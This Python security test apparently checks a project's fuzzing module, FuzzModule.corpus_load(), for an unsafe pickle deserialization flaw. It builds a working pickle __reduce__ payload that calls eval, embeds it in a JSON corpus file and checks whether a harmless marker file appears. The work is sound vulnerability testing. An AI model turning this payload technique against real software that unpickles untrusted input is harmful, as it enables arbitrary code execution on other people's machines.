"""
TEST 02: Unsafe Pickle Deserialization in fuzz.py
==================================================

VULNERABILITY: FuzzModule.corpus_load() calls pickle.loads() on untrusted data
read from a JSON corpus file. An attacker who controls the corpus file can
achieve arbitrary code execution.

LOCATION: src/zexus/stdlib/fuzz.py, line 371

SEVERITY: CRITICAL - Remote Code Execution (RCE)

ATTACK VECTOR: Craft a corpus JSON file with a malicious pickle payload
in the "pickle" type entries. When a developer loads the corpus with
corpus_load(), arbitrary code executes.
"""

import sys
import os
import json
import base64
import pickle
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))


def test_pickle_deserialization_rce():
    """Demonstrate RCE via pickle deserialization in corpus_load."""
    results = []

    # --- Payload: Craft a pickle that calls os.system ---
    # We use a safe marker-file approach (touch a temp file) to prove RCE
    # without doing any real harm.
    fd, marker = tempfile.mkstemp(suffix=".pickle_rce_test")
    os.close(fd)
    os.unlink(marker)  # remove so we can detect if it gets recreated

    class Exploit:
        """Pickle payload that executes a command on unpickling."""
        def __reduce__(self):
            # This will call: open(marker, 'w').close()  -- creates a file
            return (eval, (f"open({marker!r}, 'w').close() or 'pwned'",))

    malicious_pickle = pickle.dumps(Exploit())
    encoded = base64.b64encode(malicious_pickle).decode("ascii")

    # Build the corpus file with the malicious entry
    corpus_data = {
        "corpus": [
            {"type": "pickle", "data": encoded}
        ],
        "iterations": 0,
        "crash_hashes": [],
        "crashes": [],
    }

    corpus_fd, corpus_file = tempfile.mkstemp(suffix=".json")
    os.close(corpus_fd)
    with open(corpus_file, "w") as f:
        json.dump(corpus_data, f)

    try:
        from zexus.stdlib.fuzz import FuzzModule
        loaded = FuzzModule.corpus_load(corpus_file)
        exploited = os.path.exists(marker)
        if exploited:
            os.unlink(marker)
        results.append({
            "payload": "pickle __reduce__ → eval(open(marker, 'w').close())",
            "type": "pickle_rce_corpus_load",
            "exploited": exploited,
            "detail": f"Marker file {'created' if exploited else 'NOT created'} at {marker}",
        })
    except Exception as e:
        results.append({
            "payload": "pickle __reduce__",
            "type": "pickle_rce_corpus_load",
            "exploited": False,
            "detail": f"Exception: {e}",
        })
    finally:
        if os.path.exists(corpus_file):
            os.unlink(corpus_file)
        if os.path.exists(marker):
            os.unlink(marker)

    return results


if __name__ == "__main__":
    print("=" * 70)
    print("TEST 02: Pickle Deserialization RCE in FuzzModule.corpus_load()")
    print("=" * 70)
    for r in test_pickle_deserialization_rce():
        status = "VULNERABLE" if r["exploited"] else "SAFE"
        print(f"\n[{status}] {r['type']}")
        print(f"  Payload: {r['payload']}")
        print(f"  Detail:  {r['detail']}")
